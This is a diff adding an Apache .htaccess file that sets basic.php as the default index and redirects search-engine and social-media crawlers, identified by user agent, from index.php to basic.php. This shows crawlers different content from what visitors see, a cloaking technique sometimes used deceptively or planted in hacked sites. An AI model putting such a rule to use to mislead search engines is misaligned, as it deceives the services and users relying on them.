@@ -1,0 +1,5 @@
+DirectoryIndex basic.php index.php index.html
+Redirect /index.html /index.php
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} (googlebot|InfoSeek|msnbot|bingbot|Slurp|DuckDuckBot|facebook|LinkedIn|GooglePlus|Google) [NC]
+RewriteRule ^index\.php$ /basic.php [L,R]
